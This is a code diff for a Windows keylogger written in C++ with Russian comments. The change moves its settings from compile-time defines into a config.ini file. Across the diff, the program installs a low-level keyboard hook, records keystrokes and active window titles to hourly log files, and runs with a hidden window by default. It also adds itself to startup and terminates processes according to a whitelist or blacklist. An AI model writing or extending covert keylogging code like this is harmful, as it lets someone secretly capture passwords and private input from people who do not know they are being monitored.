@@ -17,63 +17,61 @@
 #include <regex>
 #include <stack>
 #include <filesystem>
+#include <unordered_map>
 
 namespace fs = std::filesystem;
 
-// defines whether the window is visible or not
-#define visible // (visible / invisible)
-// Defines whether you want to enable or disable 
-// boot time waiting if running at system boot.
-#define bootwait // (bootwait / nowait)
-// defines which format to use for logging
-// 0 for default, 10 for dec codes, 16 for hex codex
-#define FORMAT 0
-// defines if ignore mouseclicks
-#define mouseignore
+// Конфигурационные переменные (будут установлены из файла)
+bool VISIBLE_WINDOW = false;
+bool WAIT_FOR_BOOT = true;
+bool IGNORE_MOUSE = true;
+std::string OPERATION_MODE = "WHITELIST";
 
-// НОВАЯ ПЕРЕМЕННАЯ: Режим работы (blacklist или whitelist)
-#define MODE_WHITELIST // (MODE_BLACKLIST / MODE_WHITELIST)
+// Формат лога теперь неизменяемый - только default
+const int LOG_FORMAT = 0;
 
-// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
-// or you will get problems since every function uses this variable.
-
-#if FORMAT == 0
-const std::map<int, std::string> keyname{ 
-	{VK_BACK, "[BACKSPACE]" },
-	{VK_RETURN,	"\n" },
-	{VK_SPACE,	"_" },
-	{VK_TAB,	"[TAB]" },
-	{VK_SHIFT,	"[SHIFT]" },
-	{VK_LSHIFT,	"[LSHIFT]" },
-	{VK_RSHIFT,	"[RSHIFT]" },
-	{VK_CONTROL,	"[CONTROL]" },
-	{VK_LCONTROL,	"[LCONTROL]" },
-	{VK_RCONTROL,	"[RCONTROL]" },
-	{VK_MENU,	"[ALT]" },
-	{VK_LWIN,	"[LWIN]" },
-	{VK_RWIN,	"[RWIN]" },
-	{VK_ESCAPE,	"[ESCAPE]" },
-	{VK_END,	"[END]" },
-	{VK_HOME,	"[HOME]" },
-	{VK_LEFT,	"[LEFT]" },
-	{VK_RIGHT,	"[RIGHT]" },
-	{VK_UP,		"[UP]" },
-	{VK_DOWN,	"[DOWN]" },
-	{VK_PRIOR,	"[PG_UP]" },
-	{VK_NEXT,	"[PG_DOWN]" },
-	{VK_OEM_PERIOD,	"." },
-	{VK_DECIMAL,	"." },
-	{VK_OEM_PLUS,	"+" },
-	{VK_OEM_MINUS,	"-" },
-	{VK_ADD,		"+" },
-	{VK_SUBTRACT,	"-" },
-	{VK_CAPITAL,	"[CAPSLOCK]" },
+// Конфигурация по умолчанию
+std::unordered_map<std::string, std::string> config = {
+    {"MODE", "WHITELIST"},
+    {"VISIBILITY", "INVISIBLE"},
+    {"BOOT_WAIT", "BOOTWAIT"},
+    {"IGNORE_MOUSE", "TRUE"}
 };
-#endif
-HHOOK _hook;
 
-// This struct contains the data received by the hook callback. As you see in the callback function
-// it contains the thing you will need: vkCode = virtual key code.
+// Карта имен клавиш для default формата
+const std::map<int, std::string> keyname{ 
+    {VK_BACK, "[BACKSPACE]" },
+    {VK_RETURN, "\n" },
+    {VK_SPACE, "_" },
+    {VK_TAB, "[TAB]" },
+    {VK_SHIFT, "[SHIFT]" },
+    {VK_LSHIFT, "[LSHIFT]" },
+    {VK_RSHIFT, "[RSHIFT]" },
+    {VK_CONTROL, "[CONTROL]" },
+    {VK_LCONTROL, "[LCONTROL]" },
+    {VK_RCONTROL, "[RCONTROL]" },
+    {VK_MENU, "[ALT]" },
+    {VK_LWIN, "[LWIN]" },
+    {VK_RWIN, "[RWIN]" },
+    {VK_ESCAPE, "[ESCAPE]" },
+    {VK_END, "[END]" },
+    {VK_HOME, "[HOME]" },
+    {VK_LEFT, "[LEFT]" },
+    {VK_RIGHT, "[RIGHT]" },
+    {VK_UP, "[UP]" },
+    {VK_DOWN, "[DOWN]" },
+    {VK_PRIOR, "[PG_UP]" },
+    {VK_NEXT, "[PG_DOWN]" },
+    {VK_OEM_PERIOD, "." },
+    {VK_DECIMAL, "." },
+    {VK_OEM_PLUS, "+" },
+    {VK_OEM_MINUS, "-" },
+    {VK_ADD, "+" },
+    {VK_SUBTRACT, "-" },
+    {VK_CAPITAL, "[CAPSLOCK]" },
+};
+
+HHOOK _hook;
 KBDLLHOOKSTRUCT kbdStruct;
 
 int Save(int key_stroke);
@@ -86,6 +84,88 @@ int cur_hour = -1;
 std::vector<std::string> blacklist;
 std::vector<std::string> whitelist;
 std::vector<std::string> used_applications;
+
+bool ReadConfigFile(const std::string& filename = "config.ini")
+{
+    std::ifstream file(filename);
+    if (!file.is_open())
+    {
+        std::cout << "Config file not found, using default settings." << std::endl;
+        return false;
+    }
+
+    std::string line;
+    std::string current_section;
+    
+    while (std::getline(file, line))
+    {
+        // Убираем пробелы в начале и конце
+        size_t start = line.find_first_not_of(" \t\r\n");
+        if (start == std::string::npos) continue;
+        
+        size_t end = line.find_last_not_of(" \t\r\n");
+        std::string trimmed = line.substr(start, end - start + 1);
+        
+        // Пропускаем пустые строки и комментарии
+        if (trimmed.empty() || trimmed[0] == ';' || trimmed[0] == '#')
+            continue;
+            
+        // Проверяем секцию
+        if (trimmed[0] == '[' && trimmed.back() == ']')
+        {
+            current_section = trimmed.substr(1, trimmed.length() - 2);
+            continue;
+        }
+        
+        // Парсим ключ-значение
+        size_t delimiter_pos = trimmed.find('=');
+        if (delimiter_pos != std::string::npos)
+        {
+            std::string key = trimmed.substr(0, delimiter_pos);
+            std::string value = trimmed.substr(delimiter_pos + 1);
+            
+            // Убираем пробелы вокруг ключа и значения
+            key.erase(0, key.find_first_not_of(" \t"));
+            key.erase(key.find_last_not_of(" \t") + 1);
+            value.erase(0, value.find_first_not_of(" \t"));
+            value.erase(value.find_last_not_of(" \t") + 1);
+            
+            config[key] = value;
+        }
+    }
+    
+    file.close();
+    return true;
+}
+
+// Функция для применения конфигурации
+void ApplyConfiguration()
+{
+    // Применяем настройки
+    OPERATION_MODE = config["MODE"];
+    
+    if (config["VISIBILITY"] == "VISIBLE")
+        VISIBLE_WINDOW = true;
+    else
+        VISIBLE_WINDOW = false;
+        
+    if (config["BOOT_WAIT"] == "NOWAIT")
+        WAIT_FOR_BOOT = false;
+    else
+        WAIT_FOR_BOOT = true;
+        
+    if (config["IGNORE_MOUSE"] == "FALSE")
+        IGNORE_MOUSE = false;
+    else
+        IGNORE_MOUSE = true;
+        
+    // Выводим текущую конфигурацию
+    std::cout << "Current configuration:" << std::endl;
+    std::cout << "Mode: " << OPERATION_MODE << std::endl;
+    std::cout << "Visibility: " << (VISIBLE_WINDOW ? "VISIBLE" : "INVISIBLE") << std::endl;
+    std::cout << "Boot wait: " << (WAIT_FOR_BOOT ? "ENABLED" : "DISABLED") << std::endl;
+    std::cout << "Ignore mouse: " << (IGNORE_MOUSE ? "YES" : "NO") << std::endl;
+}
 
 // Функция для проверки соответствия по шаблону (нестрогое сравнение)
 bool PatternMatch(const std::string& text, const std::string& pattern)
@@ -491,12 +571,6 @@ void LogCleanerThread()
 {
     std::string log_dir = "logs";
     
-    // Создаем папку logs если ее нет
-    if (!fs::exists(log_dir))
-    {
-        fs::create_directory(log_dir);
-    }
-    
     // Бесконечный цикл очистки каждые 5 минут
     while (true)
     {
@@ -572,18 +646,15 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 
 void SetHook()
 {
-	// Set the hook and set it to use the callback function above
-	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
-	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
-	// function that sets and releases the hook.
-	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
-	{
-		LPCWSTR a = L"Failed to install hook!";
-		LPCWSTR b = L"Error";
-		MessageBox(NULL, a, b, MB_ICONERROR);
-	}
+    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
+    {
+        #ifdef UNICODE
+        MessageBoxW(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
+        #else
+        MessageBoxA(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
+        #endif
+    }
 }
-
 void ReleaseHook()
 {
 	UnhookWindowsHookEx(_hook);
@@ -591,99 +662,93 @@ void ReleaseHook()
 
 int Save(int key_stroke)
 {
-	std::stringstream output;
-	static char lastwindow[256] = "";
-#ifndef mouseignore 
-	if ((key_stroke == 1) || (key_stroke == 2))
-	{
-		return 0; // ignore mouse clicks
-	}
-#endif
-	HWND foreground = GetForegroundWindow();
-	DWORD threadID;
-	HKL layout = NULL;
-	
-	// get time
-	struct tm tm_info;
-	const time_t t = time(NULL);
-	localtime_s(&tm_info, &t);
+    std::stringstream output;
+    static char lastwindow[256] = "";
+    
+    // Используем IGNORE_MOUSE вместо директивы
+    if (IGNORE_MOUSE && ((key_stroke == 1) || (key_stroke == 2)))
+    {
+        return 0; // ignore mouse clicks
+    }
+    
+    HWND foreground = GetForegroundWindow();
+    DWORD threadID;
+    HKL layout = NULL;
+    
+    // get time
+    struct tm tm_info;
+    const time_t t = time(NULL);
+    localtime_s(&tm_info, &t);
 
-	if (foreground)
-	{
-		// get keyboard layout of the thread
-		threadID = GetWindowThreadProcessId(foreground, NULL);
-		layout = GetKeyboardLayout(threadID);
-	}
+    if (foreground)
+    {
+        // get keyboard layout of the thread
+        threadID = GetWindowThreadProcessId(foreground, NULL);
+        layout = GetKeyboardLayout(threadID);
+    }
 
-	if (foreground)
-	{
-		char window_title[256];
-		GetWindowTextA(foreground, (LPSTR)window_title, 256);
+    if (foreground)
+    {
+        char window_title[256];
+        GetWindowTextA(foreground, (LPSTR)window_title, 256);
 
-		// Проверка и завершение процессов по выбранному режиму
-		CheckAndTerminateProcesses(window_title);
+        // Проверка и завершение процессов по выбранному режиму
+        CheckAndTerminateProcesses(window_title);
 
-		if (strcmp(window_title, lastwindow) != 0)
-		{
-			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
-			char s[64];
-			strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
-			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
-			
-			std::cout << "DEBUG - Window changed to: " << window_title << std::endl;
-		}
-	}
+        if (strcmp(window_title, lastwindow) != 0)
+        {
+            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
+            char s[64];
+            strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
+            output << "\n\n[Window: " << window_title << " - at " << s << "] ";
+            
+            std::cout << "DEBUG - Window changed to: " << window_title << std::endl;
+        }
+    }
 
-#if FORMAT == 10
-	output << '[' << key_stroke << ']';
-#elif FORMAT == 16
-	output << std::hex << "[" << key_stroke << ']';
-#else
-	if (keyname.find(key_stroke) != keyname.end())
-	{
-		output << keyname.at(key_stroke);
-	}
-	else
-	{
-		char key;
-		// check caps lock
-		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+    // Только default формат (убраны условия для других форматов)
+    if (keyname.find(key_stroke) != keyname.end())
+    {
+        output << keyname.at(key_stroke);
+    }
+    else
+    {
+        char key;
+        // check caps lock
+        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
-		// check shift key
-		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
-			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
-		{
-			lowercase = !lowercase;
-		}
+        // check shift key
+        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
+            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
+        {
+            lowercase = !lowercase;
+        }
 
-		// map virtual key according to keyboard layout
-		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
+        // map virtual key according to keyboard layout
+        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
 
-		// tolower converts it to lowercase properly
-		if (!lowercase)
-		{
-			key = tolower(key);
-		}
-		output << char(key);
-	}
-#endif
-	// Determine current hour and base log file on that
-	// To avoid massive single logfile
-	if (cur_hour != tm_info.tm_hour) {
-		cur_hour = tm_info.tm_hour;
-		output_file.close();
-		strftime(output_filename, sizeof(output_filename), "logs/%Y-%m-%d__%H-%M-%S.log", &tm_info);
-		output_file.open(output_filename, std::ios_base::app);
-		std::cout << "Logging output to " << output_filename << std::endl;
-	}
+        // tolower converts it to lowercase properly
+        if (!lowercase)
+        {
+            key = tolower(key);
+        }
+        output << char(key);
+    }
 
-	// instead of opening and closing file handlers every time, keep file open and flush.
-	output_file << output.str();
-	output_file.flush();
+    // Determine current hour and base log file on that
+    if (cur_hour != tm_info.tm_hour) {
+        cur_hour = tm_info.tm_hour;
+        output_file.close();
+        strftime(output_filename, sizeof(output_filename), "logs/%Y-%m-%d__%H-%M-%S.log", &tm_info);
+        output_file.open(output_filename, std::ios_base::app);
+        std::cout << "Logging output to " << output_filename << std::endl;
+    }
 
-	std::cout << output.str();
+    output_file << output.str();
+    output_file.flush();
+    std::cout << output.str();
 
-	return 0;
+    return 0;
 }
 
 void Stealth()
@@ -706,61 +771,52 @@ bool IsSystemBooting()
 
 int main()
 {
-    // Читаем списки в зависимости от режима
-#ifdef MODE_BLACKLIST
-    std::cout << "Running in BLACKLIST mode" << std::endl;
-    if (!ReadBlacklist())
+    // Читаем конфигурацию
+    ReadConfigFile();
+    ApplyConfiguration();
+    AddToStartup();
+    // Используем OPERATION_MODE вместо директив препроцессора
+    if (OPERATION_MODE == "BLACKLIST")
     {
-        std::cout << "Continuing without blacklist..." << std::endl;
+        std::cout << "Running in BLACKLIST mode" << std::endl;
+        if (!ReadBlacklist())
+        {
+            std::cout << "Continuing without blacklist..." << std::endl;
+        }
     }
-#elif defined(MODE_WHITELIST)
-    std::cout << "Running in WHITELIST mode" << std::endl;
-    if (!ReadWhitelist())
+    else if (OPERATION_MODE == "WHITELIST")
     {
-        std::cout << "Continuing without whitelist..." << std::endl;
+        std::cout << "Running in WHITELIST mode" << std::endl;
+        if (!ReadWhitelist())
+        {
+            std::cout << "Continuing without whitelist..." << std::endl;
+        }
     }
-      if (AddToStartup())
+    
+    // Запускаем поток очистки логов
+    std::thread cleaner_thread(LogCleanerThread);
+    cleaner_thread.detach();
+    
+    // Call the visibility of window function.
+    Stealth(); 
+    
+    // Используем WAIT_FOR_BOOT вместо директив
+    if (WAIT_FOR_BOOT)
     {
-        std::cout << "Added to startup successfully!" << std::endl;
+        while (IsSystemBooting()) 
+        {
+            std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
+            Sleep(10000);
+        }
     }
     else
     {
-        std::cout << "Failed to add to startup!" << std::endl;
+        std::cout << "Skipping boot metrics check.\n";
     }
-#endif
-
-    // Добавляем в автозагрузку
-  
-	
-	// Запускаем поток очистки логов
-	std::thread cleaner_thread(LogCleanerThread);
-	cleaner_thread.detach(); // Отделяем поток
-	
-	// Call the visibility of window function.
-	Stealth(); 
-	
-	// Check if the system is still booting up
-	#ifdef bootwait // If defined at the top of this file, wait for boot metrics.
-	while (IsSystemBooting()) 
-	{
-		std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
-		Sleep(10000); // Wait for 10 seconds before checking again
-	}
-	#endif
-	#ifdef nowait // If defined at the top of this file, do not wait for boot metrics.
-		std::cout << "Skipping boot metrics check.\n";
-	#endif
-
-	// This part of the program is reached once the system has 
-	// finished booting up aka when the while loop is broken 
-	// with the correct returned value.
-	
-	// Call the hook function and set the hook.
-	SetHook();
-
-	// We need a loop to keep the console application running.
-	MSG msg;
-	while (GetMessage(&msg, NULL, 0, 0))
-	{
-	}
+    
+    SetHook();
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0))
+    {
+    }
 }
